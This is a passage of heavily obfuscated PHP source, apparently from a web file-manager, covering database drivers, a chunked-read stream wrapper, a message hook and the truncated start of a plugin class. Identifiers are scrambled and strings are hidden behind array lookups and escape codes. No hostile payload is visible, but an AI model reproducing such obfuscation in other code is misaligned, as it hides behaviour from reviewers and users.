array(); if ($•´ÔöÚ) { foreach ($•´ÔöÚ as $¿—ĞÄ˜ => $À¨¿Ö–) { $Ò¢¦¬ƒº[$¿—ĞÄ˜] = current($À¨¿Ö–); } } return $Ò¢¦¬ƒº; } public function replace($Ù‰ŠĞÎÈ, $şËÃÚÒ– = array()) { $ëğ­Ëå =& $_SERVER[¼èá¯æÙ]; foreach ($Ù‰ŠĞÎÈ as $˜å´±Ï => $æçŞ’·¼) { $ı·ÖÂ‡Š = $this->parseValue($æçŞ’·¼); if (is_scalar($ı·ÖÂ‡Š)) { $Âñå•¸—[] = $ı·ÖÂ‡Š; $ç¤½íÀ[] = $this->parseKey($˜å´±Ï); } } $šÓôÃêÙ = $ëğ­Ëå[984] . $this->parseTable($şËÃÚÒ–[$ëğ­Ëå[368]]) . $ëğ­Ëå[985] . implode($ëğ­Ëå[50], $ç¤½íÀ) . $ëğ­Ëå[986] . implode($ëğ­Ëå[50], $Âñå•¸—) . $ëğ­Ëå[987]; return $this->execute($šÓôÃêÙ); } public function insertAll($Ğ‘ò´–, $şÆ…®Óµ = array(), $Éºèü¸ı = false) { $Ø¹‰ªë² =& $_SERVER[¼èá¯æÙ]; if (!is_array($Ğ‘ò´–[0])) { return !1; } $Ñì«Ïä = array_keys($Ğ‘ò´–[0]); $öå¹İ­ = array(); foreach ($Ğ‘ò´– as $îçííË™) { $Ùˆ—¬€ñ = array(); foreach ($îçííË™ as $Ğ†Ë ‚® => $€§°´æï) { $€§°´æï = $this->parseValue($€§°´æï); if (is_scalar($€§°´æï)) { $Ùˆ—¬€ñ[] = $€§°´æï; } } $öå¹İ­[] = $Ø¹‰ªë²[349] . implode($Ø¹‰ªë²[50], $Ùˆ—¬€ñ) . $Ø¹‰ªë²[987]; } array_walk($Ñì«Ïä, array($this, $Ø¹‰ªë²[988])); $‹©¼— = $Éºèü¸ı ? $Ø¹‰ªë²[989] : $Ø¹‰ªë²[990]; $å—õÎ»è = $‹©¼— . $Ø¹‰ªë²[991] . $this->parseTable($şÆ…®Óµ[$Ø¹‰ªë²[368]]) . $Ø¹‰ªë²[985] . implode($Ø¹‰ªë²[50], $Ñì«Ïä) . $Ø¹‰ªë²[992] . implode($Ø¹‰ªë²[50], $öå¹İ­); return $this->execute($å—õÎ»è); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $«ĞÎß³£ =& $_SERVER[¼èá¯æÙ]; $this->error = $this->_linkID->errno . $«ĞÎß³£[4] . $this->_linkID->error; if ($«ĞÎß³£[12] != $this->queryStr) { $this->error .= LNG($«ĞÎß³£[48]) . $this->queryStr; } think_trace($this->error, $«ĞÎß³£[12], $«ĞÎß³£[49]); return $this->error; } public function escapeString($Œ²·ğ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Œ²·ğ); } else { return addslashes($Œ²·ğ); } } public function parseKey(&$ˆüÜÅïˆ, $€ÒÏò€ = true) { $úÎŠ£ÃÅ =& $_SERVER[¼èá¯æÙ]; if ($€ÒÏò€) { $ˆüÜÅïˆ = $this->parseKeyCheck($ˆüÜÅïˆ); } if ($ˆüÜÅïˆ != $úÎŠ£ÃÅ[232] && !preg_match($úÎŠ£ÃÅ[993], $ˆüÜÅïˆ)) { $ˆüÜÅïˆ = $úÎŠ£ÃÅ[472] . trim($ˆüÜÅïˆ, $úÎŠ£ÃÅ[472]) . $úÎŠ£ÃÅ[472]; } return $ˆüÜÅïˆ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($úôØ²½ = '') { $Ô™â³½ı =& $_SERVER[¼èá¯æÙ]; if (!class_exists($Ô™â³½ı[996])) { think_exception(think_lang($Ô™â³½ı[14]) . $Ô™â³½ı[997]); } if (!empty($úôØ²½)) { $this->config = $úôØ²½; if (empty($this->config[$Ô™â³½ı[17]])) { $this->config[$Ô™â³½ı[17]] = array(); } } } public function connect($­õµÄŸ‹ = '', $Á€íİ = 0) { $¾Íà÷®‰ =& $_SERVER[¼èá¯æÙ]; if (!isset($this->linkID[$Á€íİ])) { if (empty($­õµÄŸ‹)) { $­õµÄŸ‹ = $this->config; } $‹¡ê† = !empty($­õµÄŸ‹[$¾Íà÷®‰[17]][$¾Íà÷®‰[18]]) ? $­õµÄŸ‹[$¾Íà÷®‰[17]][$¾Íà÷®‰[18]] : $this->pconnect; if ($‹¡ê†) { $­õµÄŸ‹[$¾Íà÷®‰[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Á€íİ] = new PDO($­õµÄŸ‹[$¾Íà÷®‰[998]], $­õµÄŸ‹[$¾Íà÷®‰[970]], $­õµÄŸ‹[$¾Íà÷®‰[971]], $­õµÄŸ‹[$¾Íà÷®‰[17]]); } catch (PDOException $ÈÊŠÎÔù) { think_exception($ÈÊŠÎÔù->getMessage()); } $this->dbType = $this->_getDsnType($­õµÄŸ‹[$¾Íà÷®‰[998]]); if (in_array($this->dbType, array($¾Íà÷®‰[999], $¾Íà÷®‰[1000], $¾Íà÷®‰[1001], $¾Íà÷®‰[1002]))) { think_exception($¾Íà÷®‰[1003] . $this->dbType . $¾Íà÷®‰[1004] . $this->dbType . $¾Íà÷®‰[1005]); } if (!$this->linkID[$Á€íİ]) { think_exception($¾Íà÷®‰[1006]); } try { $this->linkID[$Á€íİ]->exec($¾Íà÷®‰[1007] . think_config($¾Íà÷®‰[973])); } catch (Exception $ÈÊŠÎÔù) { } $this->connected = !0; if (1 != think_config($¾Íà÷®‰[22])) { unset($this->config); } } return $this->linkID[$Á€íİ]; } public function free() { $this->PDOStatement = null; } public function query($¼œ¿Šëö, $£ìïû¤õ = array()) { $û«ğ¨ú‹ =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¼œ¿Šëö; if (!empty($£ìïû¤õ)) { $this->queryStr .= $û«ğ¨ú‹[1008] . print_r($£ìïû¤õ, !0) . $û«ğ¨ú‹[1009]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($û«ğ¨ú‹[23], 1); think_status($û«ğ¨ú‹[24]); $this->PDOStatement = $this->_linkID->prepare($¼œ¿Šëö); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $õâİ¸Ù‘ = $this->PDOStatement->execute($£ìïû¤õ); $this->debug(); if (!1 === $õâİ¸Ù‘) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¦•ùµ›, $Àãà“­ú = array()) { $ãÎïáĞö =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¦•ùµ›; if (!empty($Àãà“­ú)) { $this->queryStr .= $ãÎïáĞö[1008] . print_r($Àãà“­ú, !0) . $ãÎïáĞö[1009]; } $µ‡ÂÆ×Ğ = !1; if ($this->dbType == $ãÎïáĞö[1002]) { if (preg_match($ãÎïáĞö[1010], $this->queryStr, $èñ“Öœ)) { $this->table = think_config($ãÎïáĞö[1011]) . str_ireplace(think_config($ãÎïáĞö[1012]), $ãÎïáĞö[63], $èñ“Öœ[2]); $µ‡ÂÆ×Ğ = (bool) $this->query($ãÎïáĞö[1013] . strtoupper($this->table) . $ãÎïáĞö[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ãÎïáĞö[25], 1); think_status($ãÎïáĞö[24]); $this->PDOStatement = $this->_linkID->prepare($¦•ùµ›); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ßâÔ¬Ÿ™ = $this->PDOStatement->execute($Àãà“­ú); $this->debug(); if (!1 === $ßâÔ¬Ÿ™) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($µ‡ÂÆ×Ğ || preg_match($ãÎïáĞö[1014], $¦•ùµ›)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $³±«æÕ… = $this->_linkID->commit(); $this->transTimes = 0; if (!$³±«æÕ…) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $›ªı´¸Ï = $this->_linkID->rollback(); $this->transTimes = 0; if (!$›ªı´¸Ï) { $this->error(); return !1; } } return !0; } private function getAll() { $ÑËÕå¡² = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ÑËÕå¡²); return $ÑËÕå¡²; } public function getFields($¿õ†·Û‰) { $ãé—”ù„ =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!0); if (think_config($ãé—”ù„[1015])) { $™ùÙ–ğÁ = str_replace($ãé—”ù„[1016], $¿õ†·Û‰, think_config($ãé—”ù„[1015])); } else { switch ($this->dbType) { case $ãé—”ù„[999]: case $ãé—”ù„[1017]: $™ùÙ–ğÁ = "\123\x45\114\x45\103\124\x20\x20\40\143\157\x6c\x75\x6d\156\137\156\x61\x6d\x65\x20\141\x73\x20\47\116\141\x6d\x65\x27\x2c\x20\x20\40\x64\141\x74\141\137\x74\171\x70\145\40\x61\x73\40\47\124\x79\160\x65\47\x2c\x20\x20\40\143\157\154\165\x6d\156\137\x64\145\x66\141\x75\154\x74\40\141\163\x20\47\x44\x65\x66\141\165\x6c\164\x27\x2c\x20\x20\40\151\163\x5f\156\165\154\154\141\142\154\145\40\x61\x73\40\47\116\x75\154\x6c\x27\12\11\11\106\122\117\x4d\11\x69\x6e\x66\x6f\x72\155\141\164\x69\157\x6e\x5f\163\x63\150\x65\x6d\x61\x2e\164\141\142\x6c\145\x73\40\101\x53\x20\164\xa\11\x9\x4a\117\x49\x4e\x9\x69\156\146\x6f\x72\x6d\141\164\151\157\x6e\137\163\x63\150\145\155\x61\56\x63\x6f\154\165\x6d\156\x73\x20\101\123\40\x63\xa\11\x9\x4f\116\40\x20\x74\56\164\141\x62\154\x65\x5f\x63\141\164\141\x6c\157\x67\40\75\x20\143\x2e\164\x61\142\x6c\145\x5f\x63\141\164\x61\x6c\x6f\147\xa\x9\x9\x41\116\x44\40\x74\x2e\x74\x61\142\x6c\x65\137\x73\x63\150\x65\155\x61\40\x3d\40\143\x2e\x74\141\x62\x6c\x65\137\163\x63\x68\x65\x6d\141\xa\x9\11\101\116\104\x20\x74\56\164\141\142\154\145\137\x6e\x61\x6d\145\x20\x3d\40\x63\56\164\x61\x62\154\145\x5f\x6e\x61\155\145\12\11\x9\127\110\x45\122\x45\x20\x20\40\164\x2e\x74\141\x62\154\x65\137\x6e\x61\x6d\x65\40\x3d\x20\47{$¿õ†·Û‰}\x27"; break; case $ãé—”ù„[1018]: $™ùÙ–ğÁ = $ãé—”ù„[1019] . $¿õ†·Û‰ . $ãé—”ù„[1020]; break; case $ãé—”ù„[1000]: case $ãé—”ù„[1002]: $™ùÙ–ğÁ = $ãé—”ù„[1021] . $ãé—”ù„[1022] . $ãé—”ù„[1023] . strtoupper($¿õ†·Û‰) . $ãé—”ù„[1024] . strtoupper($¿õ†·Û‰) . $ãé—”ù„[1025]; break; case $ãé—”ù„[1026]: $™ùÙ–ğÁ = $ãé—”ù„[1027] . $¿õ†·Û‰ . $ãé—”ù„[1028]; break; case $ãé—”ù„[1001]: break; case $ãé—”ù„[1029]: default: $™ùÙ–ğÁ = $ãé—”ù„[1030] . ($this->dbType == $ãé—”ù„[1029] ? "\140{$¿õ†·Û‰}\x60" : $¿õ†·Û‰); } } $ş–¿å§Š = $this->query($™ùÙ–ğÁ); $¬²Ìã÷° = array(); if ($ş–¿å§Š) { foreach ($ş–¿å§Š as $ë¡½â”ø => $šášÌ¸á) { $šášÌ¸á = array_change_key_case($šášÌ¸á); $šášÌ¸á[$ãé—”ù„[32]] = isset($šášÌ¸á[$ãé—”ù„[32]]) ? $šášÌ¸á[$ãé—”ù„[32]] : $ãé—”ù„[63]; $šášÌ¸á[$ãé—”ù„[33]] = isset($šášÌ¸á[$ãé—”ù„[33]]) ? $šášÌ¸á[$ãé—”ù„[33]] : $ãé—”ù„[63]; $ñâô§“Ù = isset($šášÌ¸á[$ãé—”ù„[362]]) ? $šášÌ¸á[$ãé—”ù„[362]] : $šášÌ¸á[$ãé—”ù„[32]]; $¬²Ìã÷°[$ñâô§“Ù] = array($ãé—”ù„[32] => $ñâô§“Ù, $ãé—”ù„[33] => $šášÌ¸á[$ãé—”ù„[33]], $ãé—”ù„[35] => (bool) (isset($šášÌ¸á[$ãé—”ù„[116]]) && $šášÌ¸á[$ãé—”ù„[116]] === $ãé—”ù„[12] || isset($šášÌ¸á[$ãé—”ù„[35]]) && $šášÌ¸á[$ãé—”ù„[35]] === $ãé—”ù„[12]), $ãé—”ù„[37] => isset($šášÌ¸á[$ãé—”ù„[37]]) ? $šášÌ¸á[$ãé—”ù„[37]] : (isset($šášÌ¸á[$ãé—”ù„[66]]) ? $šášÌ¸á[$ãé—”ù„[66]] : $ãé—”ù„[63]), $ãé—”ù„[39] => isset($šášÌ¸á[$ãé—”ù„[107]]) ? strtolower($šášÌ¸á[$ãé—”ù„[107]]) == $ãé—”ù„[41] : (isset($šášÌ¸á[$ãé—”ù„[67]]) ? $šášÌ¸á[$ãé—”ù„[67]] : !1), $ãé—”ù„[42] => isset($šášÌ¸á[$ãé—”ù„[1031]]) ? strtolower($šášÌ¸á[$ãé—”ù„[1031]]) == $ãé—”ù„[44] : (isset($šášÌ¸á[$ãé—”ù„[107]]) ? $šášÌ¸á[$ãé—”ù„[107]] : !1)); } } return $¬²Ìã÷°; } public function getTables($ü§¡¾éŠ = '') { $Ñ¤Ëş˜ =& $_SERVER[¼èá¯æÙ]; if (think_config($Ñ¤Ëş˜[1032])) { $„®€„¡ = str_replace($Ñ¤Ëş˜[1033], $ü§¡¾éŠ, think_config($Ñ¤Ëş˜[1032])); } else { switch ($this->dbType) { case $Ñ¤Ëş˜[1000]: case $Ñ¤Ëş˜[1002]: $„®€„¡ = $Ñ¤Ëş˜[1034]; break; case $Ñ¤Ëş˜[999]: case $Ñ¤Ëş˜[1017]: $„®€„¡ = $Ñ¤Ëş˜[1035]; break; case $Ñ¤Ëş˜[1026]: $„®€„¡ = $Ñ¤Ëş˜[1036]; break; case $Ñ¤Ëş˜[1001]: think_exception(think_lang($Ñ¤Ëş˜[1037]) . $Ñ¤Ëş˜[1038]); break; case $Ñ¤Ëş˜[1018]: $„®€„¡ = $Ñ¤Ëş˜[45] . $Ñ¤Ëş˜[46] . $Ñ¤Ëş˜[47]; break; case $Ñ¤Ëş˜[1029]: default: if (!empty($ü§¡¾éŠ)) { $„®€„¡ = $Ñ¤Ëş˜[981] . $ü§¡¾éŠ . $Ñ¤Ëş˜[982]; } else { $„®€„¡ = $Ñ¤Ëş˜[983]; } } } $©Í¡‡ ³ = $this->query($„®€„¡); $Üğ€¤¸´ = array(); foreach ($©Í¡‡ ³ as $‹öğşØ’ => $¹¡Ó´³…) { $Üğ€¤¸´[$‹öğşØ’] = current($¹¡Ó´³…); } return $Üğ€¤¸´; } protected function parseLimit($øá’üØÀ) { $Ò±Ä£§¯ =& $_SERVER[¼èá¯æÙ]; $ô•™¿ = $Ò±Ä£§¯[12]; if (!empty($øá’üØÀ)) { switch ($this->dbType) { case $Ò±Ä£§¯[1026]: case $Ò±Ä£§¯[1018]: $øá’üØÀ = explode($Ò±Ä£§¯[50], $øá’üØÀ); if (count($øá’üØÀ) > 1) { $ô•™¿ .= $Ò±Ä£§¯[51] . $øá’üØÀ[1] . $Ò±Ä£§¯[52] . $øá’üØÀ[0] . $Ò±Ä£§¯[53]; } else { $ô•™¿ .= $Ò±Ä£§¯[51] . $øá’üØÀ[0] . $Ò±Ä£§¯[53]; } break; case $Ò±Ä£§¯[999]: case $Ò±Ä£§¯[1017]: break; case $Ò±Ä£§¯[1001]: break; case $Ò±Ä£§¯[1000]: case $Ò±Ä£§¯[1002]: break; case $Ò±Ä£§¯[1029]: default: $ô•™¿ .= $Ò±Ä£§¯[51] . $øá’üØÀ . $Ò±Ä£§¯[53]; } } return $ô•™¿; } public function parseKey(&$ğ¦ÑÈòü, $Ã±µîÛé = true) { $Ø¾ïÆ˜† =& $_SERVER[¼èá¯æÙ]; if ($Ã±µîÛé) { $ğ¦ÑÈòü = $this->parseKeyCheck($ğ¦ÑÈòü); } if ($this->dbType == $Ø¾ïÆ˜†[1029]) { if ($ğ¦ÑÈòü != $Ø¾ïÆ˜†[232] && !preg_match($Ø¾ïÆ˜†[993], $ğ¦ÑÈòü)) { $ğ¦ÑÈòü = $Ø¾ïÆ˜†[472] . trim($ğ¦ÑÈòü, $Ø¾ïÆ˜†[472]) . $Ø¾ïÆ˜†[472]; } return $ğ¦ÑÈòü; } else { return parent::parseKey($ğ¦ÑÈòü, $Ã±µîÛé); } } public function close() { $this->_linkID = null; } public function error() { $ÁŞÛŒ«³ =& $_SERVER[¼èá¯æÙ]; if ($this->PDOStatement) { $†ñí¦õŞ = $this->PDOStatement->errorInfo(); $this->error = $†ñí¦õŞ[1] . $ÁŞÛŒ«³[4] . $†ñí¦õŞ[2]; } else { $this->error = $ÁŞÛŒ«³[12]; } if ($ÁŞÛŒ«³[12] != $this->queryStr) { $this->error .= LNG($ÁŞÛŒ«³[48]) . $this->queryStr; } think_trace($this->error, $ÁŞÛŒ«³[12], $ÁŞÛŒ«³[49]); return $this->error; } public function escapeString($Èİœ‹¸å) { $í¾¤ªœÇ =& $_SERVER[¼èá¯æÙ]; switch ($this->dbType) { case $í¾¤ªœÇ[1026]: case $í¾¤ªœÇ[999]: case $í¾¤ªœÇ[1017]: case $í¾¤ªœÇ[1029]: return addslashes($Èİœ‹¸å); case $í¾¤ªœÇ[1001]: case $í¾¤ªœÇ[1018]: case $í¾¤ªœÇ[1000]: case $í¾¤ªœÇ[1002]: return str_ireplace($í¾¤ªœÇ[68], $í¾¤ªœÇ[69], $Èİœ‹¸å); } } protected function parseValue($ëÜûÆßÎ) { $¤õ·Àâ =& $_SERVER[¼èá¯æÙ]; if (is_string($ëÜûÆßÎ)) { $çˆöàÉ˜ = strpos($ëÜûÆßÎ, $¤õ·Àâ[4]) === 0 && in_array($ëÜûÆßÎ, array_keys($this->bind)); $ëÜûÆßÎ = $çˆöàÉ˜ ? $this->escapeString($ëÜûÆßÎ) : $¤õ·Àâ[1039] . $this->escapeString($ëÜûÆßÎ) . $¤õ·Àâ[1039]; } elseif (isset($ëÜûÆßÎ[0]) && is_string($ëÜûÆßÎ[0]) && strtolower($ëÜûÆßÎ[0]) == $¤õ·Àâ[384]) { $ëÜûÆßÎ = $this->escapeString($ëÜûÆßÎ[1]); } elseif (is_array($ëÜûÆßÎ)) { $ëÜûÆßÎ = array_map(array($this, $¤õ·Àâ[1040]), $ëÜûÆßÎ); } elseif (is_bool($ëÜûÆßÎ)) { $ëÜûÆßÎ = $ëÜûÆßÎ ? $¤õ·Àâ[101] : $¤õ·Àâ[240]; } elseif (is_null($ëÜûÆßÎ)) { $ëÜûÆßÎ = $¤õ·Àâ[116]; } return $ëÜûÆßÎ; } public function getLastInsertId() { $Ş§×ÉÖ =& $_SERVER[¼èá¯æÙ]; switch ($this->dbType) { case $Ş§×ÉÖ[1026]: case $Ş§×ÉÖ[1018]: case $Ş§×ÉÖ[999]: case $Ş§×ÉÖ[1017]: case $Ş§×ÉÖ[1001]: case $Ş§×ÉÖ[1029]: return $this->_linkID->lastInsertId(); case $Ş§×ÉÖ[1000]: case $Ş§×ÉÖ[1002]: $ÈúğÔÇ¯ = $this->table; $ƒ”Úî Á = $this->query("\x53\105\114\x45\x43\124\x20{$ÈúğÔÇ¯}\56\x63\165\x72\162\x76\x61\x6c\x20\143\x75\x72\162\x76\x61\154\40\x46\x52\117\x4d\x20\x64\165\x61\x6c"); return $ƒ”Úî Á ? $ƒ”Úî Á[0][$Ş§×ÉÖ[1041]] : 0; } } } goto f¶¿»ò´£; fÆÊÜ“øõ´: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ˆìÚÅìá, $®¦˜¢¨Ø = '') { $this->info = $this->info($ˆìÚÅìá); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¼èá¯æÙ][97]]; $this->pathOpen = $ˆìÚÅìá; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ˆìÚÅìá])) { self::$_chunkBuffer[$ˆìÚÅìá] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ÜÜ£É™ø) { $Çµî¯Š = $this->fileSubstr($this->pose, $ÜÜ£É™ø); $this->pose += strlen($Çµî¯Š); return $Çµî¯Š; } public function stream_tell() { return $this->pose; } public function stream_seek($‡æÁ“Ìé, $ÆšÈİàÈ) { $â‘ç¸¡ =& $_SERVER[¼èá¯æÙ]; if ($ÆšÈİàÈ == SEEK_SET) { $this->pose = $‡æÁ“Ìé; } else { if ($ÆšÈİàÈ == SEEK_CUR) { $this->pose += $‡æÁ“Ìé; } else { if ($ÆšÈİàÈ == SEEK_END) { $this->pose = $this->info[$â‘ç¸¡[89]] + intval($‡æÁ“Ìé); } } } if ($‡æÁ“Ìé < 0) { $this->pose = $this->info[$â‘ç¸¡[89]] + $‡æÁ“Ìé; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¼èá¯æÙ][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Õ÷‚…†ó, $ŒÉŞÎëÀ) { $¨Á™óç³ =& $_SERVER[¼èá¯æÙ]; $õŠ£Ò³™ = $this->info($Õ÷‚…†ó); return array($¨Á™óç³[1405] => 0, $¨Á™óç³[1614] => 0, $¨Á™óç³[16] => 32768 + 511, $¨Á™óç³[1615] => 0, $¨Á™óç³[1616] => 0, $¨Á™óç³[1617] => 0, $¨Á™óç³[1618] => 0, $¨Á™óç³[89] => $õŠ£Ò³™[$¨Á™óç³[89]], $¨Á™óç³[1619] => $õŠ£Ò³™[$¨Á™óç³[1460]], $¨Á™óç³[1576] => $õŠ£Ò³™[$¨Á™óç³[98]], $¨Á™óç³[1575] => $õŠ£Ò³™[$¨Á™óç³[243]], $¨Á™óç³[1620] => 0, $¨Á™óç³[1621] => 0); } static $fileInfo = array(); public function info($‰Ÿ´¢ùğ) { $°ë¢İŠû = $_SERVER[¼èá¯æÙ][1622]; if (isset(self::$fileInfo[$‰Ÿ´¢ùğ])) { return self::$fileInfo[$‰Ÿ´¢ùğ]; } if (substr($‰Ÿ´¢ùğ, 0, strlen($°ë¢İŠû)) != $°ë¢İŠû) { return !1; } self::$fileInfo[$‰Ÿ´¢ùğ] = IO::info(substr($‰Ÿ´¢ùğ, strlen($°ë¢İŠû))); return self::$fileInfo[$‰Ÿ´¢ùğ]; } public static function read($Ò¹¦õÆ, $‰ã†ÀœÜ, $İÂ‘ÁÕµ) { if (!isset(self::$_fopenCache[$Ò¹¦õÆ])) { $ûÈ«‡ŞÅ = new StreamWrapperIO(); $ûÈ«‡ŞÅ->stream_open($Ò¹¦õÆ); self::$_fopenCache[$Ò¹¦õÆ] = $ûÈ«‡ŞÅ; } $ûÈ«‡ŞÅ = self::$_fopenCache[$Ò¹¦õÆ]; return $ûÈ«‡ŞÅ->fileSubstr($‰ã†ÀœÜ, $İÂ‘ÁÕµ); } public static function _read($»ÏÂ÷¢÷, $ŠÌ›é¤İ, $Ò¯–¦Äë) { $•½—ñ­ =& $_SERVER[¼èá¯æÙ]; $öğÛëø = fopen($»ÏÂ÷¢÷, $•½—ñ­[1464]); if (!$öğÛëø) { return $•½—ñ­[12]; } $õÑ½ïò = 8192; fseek($öğÛëø, $ŠÌ›é¤İ, SEEK_SET); $Ï«ˆ÷ıë = $•½—ñ­[12]; $íÀÆŠÓ‚ = 0; while ($íÀÆŠÓ‚ < $Ò¯–¦Äë) { $‹ ¶Áã‰ = min($õÑ½ïò, $Ò¯–¦Äë - $íÀÆŠÓ‚); $Ï«ˆ÷ıë .= fread($öğÛëø, $‹ ¶Áã‰); $íÀÆŠÓ‚ += $‹ ¶Áã‰; } fclose($öğÛëø); return $Ï«ˆ÷ıë; } public function fileSubstr($Š¹´¾ÜŞ, $¥á˜»€Ü) { $Ëæ›¹Ò =& $_SERVER[¼èá¯æÙ]; $è¤±¬­ = $this->info[$Ëæ›¹Ò[89]]; $ñ“åÇ«‹ = $Š¹´¾ÜŞ; $Êı‡ìé = $¥á˜»€Ü; if ($Š¹´¾ÜŞ < 0) { $Š¹´¾ÜŞ = $è¤±¬­ + $Š¹´¾ÜŞ; } if ($¥á˜»€Ü === !1) { $¥á˜»€Ü = $è¤±¬­ - $Š¹´¾ÜŞ; } if ($Š¹´¾ÜŞ + $¥á˜»€Ü > $è¤±¬­) { $¥á˜»€Ü = $è¤±¬­ - $Š¹´¾ÜŞ; } if ($¥á˜»€Ü <= 0) { return $Ëæ›¹Ò[12]; } if ($Š¹´¾ÜŞ < 0 || $Š¹´¾ÜŞ >= $è¤±¬­ || $¥á˜»€Ü <= 0 || $¥á˜»€Ü > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\x6c\x65\x52\x65\x61\x64\x20\145\162\x72\157\x72\x21\40\163\x74\x61\162\x74\x3d{$Š¹´¾ÜŞ}\73\154\x65\x6e\147\164\x68\75{$¥á˜»€Ü}\73\40\163\x69\x7a\x65\x3d{$è¤±¬­}\x3b"); } $Óä¬Å•ê = 64 * 1024; $ØÍö¦Îë =& self::$_chunkBuffer[$this->path]; if (!$ØÍö¦Îë) { $ØÍö¦Îë = array(); } $°‰¤ö¸ = 0; $×¸»÷•› = 0; $äºÉç¯– = $Ëæ›¹Ò[12]; foreach ($ØÍö¦Îë as $°‰¤ö¸ => $äºÉç¯–) { $°‰¤ö¸ = intval($°‰¤ö¸); $×¸»÷•› = $°‰¤ö¸ + strlen($äºÉç¯–); if ($Š¹´¾ÜŞ >= $×¸»÷•›) { continue; } if ($Š¹´¾ÜŞ >= $°‰¤ö¸ && $Š¹´¾ÜŞ + $¥á˜»€Ü <= $×¸»÷•›) { return substr($äºÉç¯–, $Š¹´¾ÜŞ - $°‰¤ö¸, $¥á˜»€Ü); } break; } if (count($ØÍö¦Îë) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ëæ›¹Ò[1623], $Ëæ›¹Ò[1624] . count($ØÍö¦Îë) . "\73\163\x74\x61\x72\x74\x3d{$Š¹´¾ÜŞ}\x2c\x6c\145\x6e\147\164\x68\x3d{$¥á˜»€Ü}\73\160\157\163\145\x3a{$°‰¤ö¸}\176{$×¸»÷•›}"); throw new Exception($Ëæ›¹Ò[1625]); } $«õ“’º¦ = intval($Š¹´¾ÜŞ / $Óä¬Å•ê) * $Óä¬Å•ê; $×øàõÃØ = ceil(($Š¹´¾ÜŞ + $¥á˜»€Ü) / $Óä¬Å•ê) * $Óä¬Å•ê - $«õ“’º¦; $ı…Äá•Â = IO::fileSubstr($this->path, $«õ“’º¦, $×øàõÃØ); $ØÍö¦Îë[$«õ“’º¦ . $Ëæ›¹Ò[12]] = $ı…Äá•Â; ksort($ØÍö¦Îë); $Ë“ÈÁ“ = substr($ı…Äá•Â, $Š¹´¾ÜŞ - $«õ“’º¦, $¥á˜»€Ü); return $Ë“ÈÁ“; } private function log($÷ú’ö“Î, $¹½¾‹è¸) { $õİåù‚‹ =& $_SERVER[¼èá¯æÙ]; $˜¾ã³†„ = timeFloat() - $this->timeStart; write_log(sprintf($õİåù‚‹[1626], $÷ú’ö“Î, $this->info[$õİåù‚‹[32]], $˜¾ã³†„, $¹½¾‹è¸), $õİåù‚‹[1269]); } } class Message { function __construct() { } public function send($»÷ßŞÈ§ = '', $ë±î§Œù = array(), $Ê¬‰¤Ç‹ = "\164\145\170\x74") { $ıŠ¢È¼ =& $_SERVER[¼èá¯æÙ]; $‡ë»üÔ = array($ıŠ¢È¼[33] => $ıŠ¢È¼[1218], $ıŠ¢È¼[181] => $»÷ßŞÈ§); if (in_array($Ê¬‰¤Ç‹, array($ıŠ¢È¼[1218], $ıŠ¢È¼[1627]))) { $‡ë»üÔ[$ıŠ¢È¼[33]] = $Ê¬‰¤Ç‹; } $ë±î§Œù = array($ıŠ¢È¼[589] => isset($ë±î§Œù[$ıŠ¢È¼[589]]) ? $ë±î§Œù[$ıŠ¢È¼[589]] : $ıŠ¢È¼[12], $ıŠ¢È¼[676] => isset($ë±î§Œù[$ıŠ¢È¼[676]]) ? $ë±î§Œù[$ıŠ¢È¼[676]] : $ıŠ¢È¼[12]); if (empty($»÷ßŞÈ§) || empty($ë±î§Œù[$ıŠ¢È¼[589]]) && empty($ë±î§Œù[$ıŠ¢È¼[676]])) { return !1; } $òÃĞìˆ = array($ıŠ¢È¼[1556] => $‡ë»üÔ, $ıŠ¢È¼[1628] => $ë±î§Œù); Hook::trigger($ıŠ¢È¼[1629], $òÃĞìˆ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¬…ÑÈîÖ =& $_SERVER[¼èá¯æÙ]; if ($_SERVER[$¬…ÑÈîÖ[54]] != $_SERVER[$¬…ÑÈîÖ[332]]) { $„ª¢Â© = $¬…ÑÈîÖ[960]; $•‡êğÖç = $¬…ÑÈîÖ[56]; $ÄŞÒÄø = $_SERVER[$¬…ÑÈîÖ[57]] . $¬…ÑÈîÖ[58]; $ÌÀş¨´à = $•‡êğÖç($ÄŞÒÄø); $¨Ãõœü³ = explode($¬…ÑÈîÖ[59], $ÌÀş¨´à); if (count($¨Ãõœü³) < 